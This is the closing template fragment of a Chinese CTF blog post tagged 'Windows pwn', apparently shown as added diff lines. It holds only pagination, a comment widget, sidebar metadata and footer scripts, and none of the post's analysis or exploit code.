+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/07/08/长城杯铁人三项2020 企业环境渗透/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-07-09 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/赛题/">赛题<span>10</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/Windows-pwn/">Windows pwn<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-article-text">逆向分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#EXP"><span class="toc-article-text">EXP</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
